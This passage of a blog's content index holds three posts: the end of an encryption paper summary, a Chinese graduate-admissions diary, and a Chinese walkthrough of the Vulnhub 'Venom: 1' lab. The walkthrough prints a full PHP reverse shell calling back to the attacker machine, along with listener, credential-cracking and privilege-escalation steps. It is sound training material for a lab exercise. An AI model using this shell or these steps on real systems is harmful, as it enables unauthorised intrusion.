performs the corresponding operations, in this case, homomorphic addition. For example, suppose the first piece of data m1 is 8 and the second m2 is 20, so the expected result is 28. The second piece of data is deconstructed similarly to the first, with 17 + 3, 10 + 10, 4 * 5, and 10 * 2 are all equal to 20. It\u0026rsquo;s important to note that the operations here are homomorphic because the data is still encrypted.\nSince the policy says that the last four message blocks are unnecessary, so we’ll ignore those message blocks, as shown in gray background color in the picture. The encrypted result might look like this,\n2 + 17 = 19 6 + 3 = 9 3 + 10 = 13 5 + 10 = 15 The third party sends this data back to the data owner.\nThe fourth step is Decrypt. First, all data is restored to plaintext.\nNext is reconstruction. Since the data has been deconstructed, the result won\u0026rsquo;t be in its original form, so it must be reassembled. Reconstruction involves selecting one set of message blocks and performing the intended operation, in this case, addition. For instance, using the first returned set, 19 + 9 = 28, which matches our expectation.\nThe final step is Validate. Validation requires reconstructing all returned message blocks. If the reconstructed results are consistent, the data is considered trustworthy; otherwise, the result is in trouble. Consider this example: We also have a set with 13 and 15. Adding them gives us 28, consistent with the previous results, indicating that the data is trustworthy.\nNow I’ll go through another example, when evaluation under multiplication.\nIn policy formulation, I set the policy to the last four bit.\nThe rest of steps in Encrypt are the same as under addition, so I’ll skip them.\nEvaluate is similar as well, but the result policy goes to the last four bits.\nThe FHE evaluation is taken under multiplication with m1 equals to 8 and m2 equals to 20. So the expected result should be 8 times 20 equals to 160. The result after FHE evaluation is as follows.\n1 * 4 = 4 8 * 5 = 40 2 * 10 = 20 4 * 2 = 8 Again, we decrypt these results and reconstruct them. We use the first returned set 4 and 40 to gain the final result 160, which matches our expectations.\nValidate will take the other set into consideration. So we take the 20 and 8, multiply them together and gain the result, still equals to 160. Thus, now we can say the result is trustworthy.\nProperties # FHEwEC has four key properties: Correctness, Completeness, Soundness, and Security.\nCorrectness # Correctness means that the results obtained using FHEwEC are consistent with those obtained using traditional FHE. This was demonstrated in the earlier section and is formally proven in the paper. You may find that the core concept is due to the commutative law in mathematics.\nCompleteness # Completeness means that if the third party performs the expected operation correctly, the result will always pass the validation step. This is also demonstrated in the previous section.\nSoundness # Soundness means that if the third party performs an operation different from what the data owner intended, the result will not pass validation — or if it does, the probability is extremely low.\nLet’s see the first example we use in the previous section. Assume the data owner expect the third party to perform addition, and the third party runs multiplication. The third party will return result as\n2 * 17 = 34 6 * 3 = 18 3 * 10 = 30 5 * 10 = 50 When data owner conducts the validation, it figures out that 34 + 18 = 52, but 30 + 50 = 80, which is not consistent. So the result is not trustworthy. Security # Security means that the FHEwEC scheme is secure against chosen-plaintext attack. This is because the validation process occurs outside of the FHE operations, adding an extra layer without altering the core FHE encryption or computation, ensuring that its security aligns with that of FHE.\nPerformance # We conduct two experiments, one for testing the execution time with respect to the total number of message blocks N while the other for testing the number of duplication under addition s and multiplication t.\nIn both experiments, we conclude that when N increases, the execution time also increases. Additionally, the encryption time occupies the most. Most importantly, both experiments indicates that the total execution time of whole scheme is less than one second, which means that we can efficiently apply FHEwEC but solve the problem we mentioned previously.\nAgain, you can view the details in the full paper.\nOur Contribution # We identified that even in an environment secured by fully homomorphic encryption, there are still potential risks when delegating computation to a third party. To address this, we proposed the FHEwEC scheme and successfully implemented it.\nFuture Works # Evaluation Type In FHEwEC, only ring operations are supported. However, true fully homomorphic encryption should support any operations it can performs. Therefore, our first goal is to generalize this scheme to support all operations supported by FHE. Evaluation Depth Additionally, FHEwEC does not support the multi-hop feature, meaning it cannot handle operations with a depth greater than one, significantly limiting its applicability. That is also the reason that the execution time of FHEwEC is so fast. Illegal Reason Finally, while this scheme can identify issues in third-party computation, it cannot guarantee the reason leads to this is really the third party. This is because pollution may occur between transmission. After pollution, the data must not pass the Validate algorithm and thus consider the result as not trustworthy. Comments # This work was authored by Kuan-Phing Wang and Bo-Yu Chen, under the supervision of professors Po-Wen Chi and Chao Wang.\nThe study has been published in 2024 Asia Joint Conference on Information Security (Asia JCIS) and gained best paper awards. It also has passed the 113 College Student Research Scholarship National Science Committee.\n","date":"2024-12-23","externalUrl":null,"permalink":"/posts/fhewec/","section":"Blog Posts","summary":"","title":"A Study of Fully Homomorphic Encryption with Evaluation Control","type":"posts"},{"content":"這是一場鬧劇，從 2024 五月開始，一路到約同年 11 月底才結束\n舉足不前 # 會說鬧劇是因為差不多五月那時候，就在猶豫推甄、考研和延畢三條路，想推甄是因為不想讓求學生涯全都是靠考試上去，因為升大學時從繁星玩到個申玩到指考，連研究所也考試就真的很像一個考試機器，或多或少還是想證明自己不是只有會讀書會考試（雖然到大學不是這麼一回事）而已，但說到底自己的經驗不怎麼漂亮，也不知道能推到多好的地方；想考研不外乎是因為這是條熟悉又保險的路，而且無論前面狀況如何，它是一條可以翻身的機會，算是最保險的路；想延畢是因為教育學程在這兩年對我而言真的很重要，有機會去嘗試教育也會想在最後拿到一些證明，但教程修完還需要十幾學分，也需要另外生十幾學分的自由學分出來，一年之內真的沒辦法做到，想要全拿勢必得延一年畢業，但不敢做這個決定的原因是不知道這一年會有什麼變化，說不定一年之後目標都變了，做這個選擇的動機、初衷也蕩然無存\n因為這樣，這個問題卡了我兩個多月，中間找了一些人問想法，但自己也知道問在多人也沒用，因為我是一個很固執的人，再多人的分析考量有八成是聽不進去的，頂多有一些面相我沒想過會加進來想一想，就像三年前搞到繁星、個申都失利，讓身邊不知道多少人唸很久，甚至到現在還在唸（雖然我沒有後悔過）。\n想問其他人的意見充其量是尋求認同而已\n我想要什麼？我想要修完教程，延畢一年，再前往研究所，但我不敢，不是因為晚一年升學的壓力，而是不知道 20 年後回頭看這一起事件，會不會覺得為了一個之後可能不會走上的教育路拚教程是很愚蠢的事情；不知道一年過後對資安熱忱是不是還這麼強烈，還是被賽棍蹂躪到想貴出這個圈子；不知道對研究所的需求是不是這麼強烈，還是就不升學了。其實還有一個潛藏的問題是，因為我有延畢這條路，無論最終我選擇推甄或是考研，都會有一個「沒關係，我還有延畢這條路」的想法，便不會全力以赴\n給自己定的期限是 7/8，開始實習的第一天，我認為實習前應該做出決定，然後對這個決定做出下半年的規劃，當時的決定是考研，雖然身兼課業、實習還要顧及考試是艱難的任務，但還是想讓自己體驗一下極限，看看能不能因為這半年的努力翻上自己的目標學校，沒想到的是實習加通勤幾乎耗掉了大半的時間，平日回到家都很晚，讀書只剩假日的時間，照這個進度準備下去時間根本不夠，而且光是一科線代就覺得自己懶得讀，更不用說如果讀到計算機結構或作業系統會怎麼辦，剛好九月中時柏叡找我討論推甄的事情，又約了 Neokent meeting，想著甚麼都不做就去 meeting 應該會被電，才開始準備自己的 SBOM，就這樣極晚才展開推甄這條路，當時是 9/21（對啊！這個時間點可以注意，表示這麼晚開始還是有機會的，只是這是壞榜樣不要學）\n簡單來說，一個應該延畢的人，選擇了考研這條路，但最終卻以推甄畫下句點\n引言太多了，趕快進入主題\n經歷 # 拿出來備戰的武器大概分成四個面向：修課經歷、學術專題、資安經歷和其他有利審查資料\n修課經歷 # GPA 3.83，系排名 9/50 (18%) 資訊安全攻防演練、資訊安全、高等資安攻防 修課成績上這個是必須，每間學校都會看這個面向，雖然我一直覺得都到申請研究所了，不希望跟之前升高中、升大學一樣還看在校成績，畢竟 GPA 這種東西沒辦法成為說服我一個人程度好壞的依據，但很可惜，現階段的臺灣還是把成績看得非常重，尤其最前段的學校\n說實話，這個成績讓我去競爭臺清交，我都認為不太可能，所以附上這部分資料時，自己都很心虛\n這邊可以分享一個故事，我申請的所有校系裡面，臺大交大實屬過分。臺大要求在歷年成績單上註明他們在意的科目成績，還要在另一個表單填寫那些科目的成績；交大除年平均成績，也要上報每年學期成績與排名，直接看出大一到大三的學習趨勢，並要求填寫「就資訊領域的科目中，表現最佳與最差的五個科目，並進行歷年修課狀況分析」，其實這個舉動可以看出很多申請者的細節，包含修課狀況、省思，想藏拙其實也很難\n至於修課經歷上，我就是點出資訊安全攻防演練、資訊安全以及高等資安攻防這三門課，稍微說明從這三門課學到什麼\n學術專題 # A Study of Fully Homomorphic Encryption with Evaluation Control 發表於 2024 Asia Joint Conference for Information Security，獲 Best Paper Awards 通過 114 年度國科會大專生研究計畫 最有利的是這個學術專題，碩班畢竟是做研究的地方，有一個好的學術專題其實會加很多分，尤其是大學生可以發表到國際會議、研討會上，優勢會更大。我比較幸運，跟平的專題有通過國科會計畫，又發表到國際研討會上，還拿了一個獎回來，對於書審這一塊，在很多學校應該都是會注意到的地方\n準備的過程有問過 Neokent 國科會計畫和參加國際會議的效力有多大，那時候得到的答案是國科會計畫普通，但有總比沒有好，原因是大學校的教授手邊計畫一堆，經費也比國科會高得多，所以不一定會看重國科會計畫；國際會議要看，像 Asia JCIS 這種並不會是資安領域的學者聽到就會眼睛為之一亮的場所，所以效力不能說到很大，但我們有得一個獎回來，多少可以表示這篇論文的價值，也是因為這樣才成為這次推甄最大的利器\n書審上放專題可以注意的是貢獻度，幾乎每間學校都喜歡問這種連自由心證都算不上的問題，僅書審的學校當然就可以盡量往上填，有面試的學校就自己斟酌，幾個問題可以提前思考的是\n專題在做什麼？能不能用一分鐘解釋出來？ 專題的背景、細節、技術能不能深入討論？ 如果是多人專題，貢獻度如何？為什麼？ 製作專題中遇到最大的困難是什麼？又是如何解決？ 資安經歷 # 大二為期一年 CTF 讀書會 AIS3 My First CTF 第二屆、第三屆叡揚安全達人養成計畫、資安戰士挑戰賽 2023 NISRA Enlightened Google Cybersecurity Certificate 經歷上，可以說全部都是著重在資安上，畢竟從大二開始重心都放在這一塊，論程式能力或 AI 上的知識，絕對比不過一般資工系學生（嗯\u0026hellip;上大學的我好像也讓自己成為偏科型的人了），加上自己也沒什麼除了資安以外值得放上去的經歷，某種程度上來說，我的自傳和經歷變得很單純，放眼望去都是資安相關，不一定是壞事，也因為我自己這次幾乎都是申請資安所，所以這樣做還算是安全的\n認真說，如果就資安組要做推甄，比較推薦要有的經歷大概是以下幾個 雖然我都沒有就是了\nAIS3 資安實務暑期課程 台灣好厲駭 CTF 競賽，並有拿到名次 架一個網站，擺一些解題 writeups 有資安實務上找漏洞或解決問題的能力，比如 CVE 資安公司實習經驗 順帶一提，Bug Bounty 是很好的機會，如果有能力打出洞還能拿到獎金，而且這是很好展現自己對於找漏洞的能力\n其他有利審查資料 # 英文能力：TOEIC 895 企業實習：叡揚資訊 程式能力：CPE 5 題 這部分我放的除了上述資料以外，就是一些社團、活動經歷。但推甄這一路上，我不認為審查委員會很看中這一塊，或許也跟科系有關，在資工或在資安裡面，我想能力還是遠大於這些課外行為的\n準備 # 自己準備的流程大約是長這樣\nSBOM：列出自己能寫進去的事件清單 STORY：把每個事件都用差不多兩三句話描述，內容差不多就是為什麼做、做了什麼、成果如何和學到什麼。這步做完再寫自傳時工作會比較像是寫架構然後拼湊組裝，比起白紙一張開寫來的有方向 BIOGRAPHY：開始撰寫自傳，我自己以一頁的篇幅在寫，呈現內容也只是挑幾個我認為最需要談的面向而已，並不是盡量塞滿，一頁的篇幅其實很容易就寫完，但如果能寫滿兩頁，我認為會是最好的 RESEARCH：撰寫研究計畫，這邊我就沒有特別限制自己的篇幅，能展現就盡量展現，因為我認為這是審查很大的重點，記得研究計畫重點是研究，讀書計畫反而是其次，要再研究計畫呈現出自己獨一無二的地方，有做學術專題的在這時候就會有點優勢了 至於推薦信，主要工作只是要找願意幫忙寫的教授而已，準備感人肺腑的邀請函和自吹自擂的草稿就差不多了，我一樣是拖到很後期才用，這次沒報成大和中央的原因就是因為時間太趕，請老師在兩三天內送出推薦信真的不太可能，但還是很感謝有老師願意出手幫忙，完成這個必要條件\n其他工作大概就是要去對想報名的學校蒐集資料，時程、資料繳交等規定都要先看好，像今年臺科的文件就非常麻煩，自傳一個要求一頁一個要寫兩頁，變成我需要另外生一版兩頁自傳出來；報名方式也需要注意，交大要填的資料就很多，很花時間，如果沒有先處理會是一個很大的負擔\n如果可以，未來有興趣的教授也可以先有初步想法，這在後面會有很大的幫助\n面試 # 在所有報名的校系中，要面試的只有臺科資工和清大資安，我會稍微針對這兩間做分享\n清大資安 # 關於清大資安的背景這邊就不多說，資安圈的人或多或少都會知道\n面試時間一人五分鐘，題目如下\n三分鐘自我介紹 還有報考那些系所？ CTF 讀書會是到現在嗎？ MFCTF 排名如何？ 所以現在做研究比較多，競賽就沒了？ 面完其實是感覺到空虛的，這些問題的答案都很單一，固定型的答案很難繼續聊下去，有種我希望來場 QT 但得到的是 Y/N，很像只是來走個過場，還讓我一大早跑到新竹。而且提問只有兩分鐘，我是真的不知道要聊什麼\n臺科資工 # 臺科面試跟 HITCON 人才技術交流同一天，也是因為這場面試沒聽到 Mico 國際技能競賽的分享，好可惜\n臺科的面試分成兩關，第一關是黑臉，會問技術問題，第二關就比較偏個人開放式問題\n一面問題如下\n一分鐘自我介紹 同態加密是什麼？ 全同態和部分同態的差別是什麼？ Lattice 結構是什麼？ 證明 ln(k!) = Θ(nln(n))？ 給一個 A 兩個 B 三個 C 四個 D，取後放回，求抽到恰三次 C 的機率？ 問題都不難，但有一個小細節是每個教授問問題只有一分鐘，可能講完問題能思考的時間不多，尤其像第六題教授講完題目我沒辦法立刻反應，又問了一次題目，結果問完時間就到了\n二面問題如下\n一分鐘自我介紹 講解專題 專題貢獻比例與原因 專題遇到的困難 有沒有想跟哪一位教授 有沒有報師大資工所？怎麼取捨師大跟臺科？ 二面比較沒壓力，比較要注意的大概就是第五題要先對臺科的教授了解，不然回答不出來多少是尷尬的\n結果 # 讀者最在意的應該是這塊\n申請校系 結果 國立臺灣大學 電機工程學系 資訊安全碩士班 正取 11 國立臺灣科技大學 資訊工程學系乙組（AI 及資安領域） 正取 5 國立臺灣科技大學 資訊管理學系 資訊安全科技與管理碩士班 逕取 7 國立臺灣師範大學 資訊工程學系 逕取 6 國立陽明交通大學 資訊安全研究所 甲組 正取 5 國立清華大學 資訊安全研究所 備取 5 （第四梯已備上） 第一志願是交大，上了沒道理不去，雖然按下臺大電機的放棄資格那個按鈕心還是會痛就是了 然後清大的部分，倒是意料之外\n致謝 # 一路上要感謝的人很多\n最重要的是 Neokent，作為我的資安啟蒙老師，在推甄這條路上也真的幫助我很多\n第二重要的我想給 Kenneth，因為專題是我這次推甄最大的利器，而且大學這幾年走在資安這條路上，Kenneth 陪我最多，從 CTF 讀書會到專題、修課，要不是因為人在國外，不然我一定衝到面前好好感謝\n再來是蔣宗哲老師，業務繁忙還在這麼晚的時間點答應幫我生推薦信出來\n然後是柏叡，因為他讓我正式踏上推甄這條路，也常常在禮拜一中午去找 Neokent meeting 討論，準備過程少不了和他的交流\n當然從五月開始陪我聊過、分析過選擇的，準備過程陪我討論、看自傳看研究計畫，還有一起去 meeting 的所有人\n同場加映：尋找指導教授 # 交大放榜後約一個禮拜才開始寄信問指導教授，對這一路上我真的都比別人晚很多才開始處理應該處理的事情，想當然熱門的教授搶不到\n交大資安裡面我有興趣的有三位，資安圈無論如何應該都滿想進黃教授的實驗室，但就是因為太熱門了，給我速度這麼慢絕對搶不到\n謝教授的實驗室跟 Cycraft 算是滿有連結的，也是三間實驗室中事前能問到最多東西的，親自跑過給我的感覺就很像一般實驗室，研究內容也確實是我有興趣的，並沒有排斥的點，但沒選擇就只是純粹想給自己挑戰兼有更吸引我的選擇而已\n林教授會吸引我是因為兩人一間實驗室、不規定留實驗室時間還有一群外籍學長三個特色，可能是二類組待久了，就完全忘記被管的感覺，也不希望有人會對我做出無謂的管理，線上和林教授談的時候他說了一句話滿和我意思的：「我只做目標管理，不做手段管理」，就是說只要該做的事情做得出來，即便躺著寫論文，教授也沒有意見，至少這點對崇尚自由的我來說還是很有吸引力，加上一些其他因素最後還是讓我選擇這邊\n很妙的是，建議我去謝教授實驗室的人，幾乎都是真的有在碰資安的人；而建議我去林教授實驗室的人，通常都是對資安圈不了解的人，除了海豹 :)\n最後附上考量的面向供參考\n教授研究領域 碩論研究主題 親自對到教授本人的時機 教授指導學生方式 教授對學生期待 實驗室氣氛、風格 碩班時程規劃 寒暑假研究 平時待實驗室 這邊再次謝謝 Neokent 在找教授上給的意見，也謝謝孫學長對實驗室的介紹，還有海豹大大課後跟我聊的那段\n","date":"2024-12-08","externalUrl":null,"permalink":"/posts/grad-entry/","section":"Blog Posts","summary":"","title":"研究所 推甄整理 X 經驗分享","type":"posts"},{"content":"剛好是高等資安攻防 WEEK6 的作業，就順便放上來作為本網站第一篇 writeup\nStep 0. Pre-request # 準備 Kali Linux 虛擬機（以下簡稱 Kali）：\n下載 Kali (VMware)：https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-vmware-amd64.7z 開啟 Kali 準備 Venom 虛擬機（以下簡稱 Venom）\n下載 Venom.zip 檔案：https://download.vulnhub.com/venom/venom.zip 下載完成可以跑 MD5 和 SHA1 確認檔案下載完整 匯入 VMware 設定網路：對 Venom 點擊右鍵 \u0026gt; Settings \u0026gt; Network Adapter \u0026gt; NAT \u0026gt; OK 開啟 Venom 觀察網路資訊\n檢視本機網路 (ipconfig)：與 VMware 有關的 IP 為 192.168.119.1 與 192.168.225.1 在 Kali 檢視虛擬機網路 (ip a)：IP 為 192.168.225.131 比對可知，虛擬機 (Kali \u0026amp; Venom) IP 位置應為 192.168.225.0/24 Step 1. 尋找可用服務（入口） # 在 Kali 上針對 192.168.225.0/24 進行掃描，得知 Venom IP 位置應為 192.168.225.132 針對 192.168.225.132 進行掃描，觀察開啟的服務 FTP: 21 HTTP: 80 HTTPS: 443 Step 2. HTTP # 檢視 HTTP 服務相關線索：使用 curl 192.168.225.132:80 發現最後有一行註解掉的線索：`` 將線索丟到 crackstation 解密，得知該線索為 hostinger MD5 雜湊值，推測 hostinger 為 password Step 3. FTP # 由前一步得知的訊息，使用 FTP 登入 帳號：hostinger，密碼：hostinger 成功登入後使用 ls 指令看到有一個資料夾 files 使用 cd files 進入 files 資料夾再 ls 觀察底下檔案，有一個名為 hint.txt 的檔案 使用 get hint.txt 下載該檔案至 Kali 主機 使用 exit 離開 FTP 服務 打開 cat hint.txt 檔案觀察其內容 得到三組密文，看起來都是 base64 編碼 WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= 解碼後得到 standard vigenere cipher aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI= 解碼後得到 https://cryptii.com/pipes/vigenere-cipher L7f9l8@J#p%Ue+Q1234 解碼後得到，依照 hint.txt 說為 venom.box 管理者權限 (dora) 的密碼 猜測需要將 L7f9l8@J#p%Ue+Q1234 丟到 https://cryptii.com/pipes/vigenere-cipher 透過 standard vigenere cipher 進行解密得到密碼後再去 venom.box 登入 Step 4. venom.box # 去 https://cryptii.com/pipes/vigenere-cipher 進行解密，得到密碼為 E7r9t8@Q#h%Hy+M1234 透過密碼登入 venom.box 為了連上 http://venom.box ，需先在 /etc/hosts 新增 domain name 連上 venom.box 並登入，確認為 administrator 權限 也發現其網頁框架為 Subrion CMS V4.2.1 Step 5. 取得 reverse shell # 檢視是否有存在漏洞 使用 searchsploit subrion cms 4.2.1 指令 看到其中一個漏洞為可上傳任意檔案 準備 reverse shell 使用 https://revshells.com 產生 reverse shell IP 設為 Kali 的 IP 位址 192.168.132.225 port 自訂，但不衝突現存服務為原則，此 report 以 6666 示範 \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;192.168.225.131\u0026#39;; $port = 6666; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; 上傳 reverse shell 在 http://venom.box/ 上點擊齒輪圖示進到管理者頁面 (http://venom/box/panel)，點擊右方 content \u0026gt; uploads 進到上傳區 上傳準備好的 reverse shell rev.phar 取得 reverse shell 在另一個終端機上透過指令 nc -nlvp 6666 監聽 port 6666 開新分頁 http://venom.box/uploads/rev.phar 執行 web shell 終端機上成功獲取 reverse shell Step 6. 取得 root shell # 嘗試使用 sudo -i 指令切換為 root 身分，發現因為沒有 tty 所以無法執行，這樣會沒辦法拿到 root 權限 使用 python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;);' 將 shell 切換成 pty shell 再次使用 sudo -i 指令嘗試切換為 root 身分，但無從得知 www-data 的密碼 查看系統內有哪些 user，發現有 hostinger 和 nathan 兩個 將 user 切換為 hostinger，同樣嘗試執行 sudo -i 指令，發現 hostinger 沒有權限 登入 Nathan 帳戶 首先應該找到 Nathan 的密碼，使用 locate .htaccess 可以看到以下可能檔案 打開 /var/www/html/subrion/backup/.htaccess，看到一串密文，應該為 Nathan 的密碼 使用指令 su nathan 切換 user 為 Nathan 取得 root shell 使用 sudo -i 指令切換為 root 身分 進到 /root，打開 root.txt 檔案，得到 flag 參考資料 # vulnhub 靶場之 VENOM: 1 VENOM: 1 Vulnhub Walkthrough ","date":"2024-11-16","externalUrl":null,"permalink":"/posts/vulnhub-venom-1/","section":"Blog Posts","summary":"","title":"Vulnhub Venom 1 Writeup","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]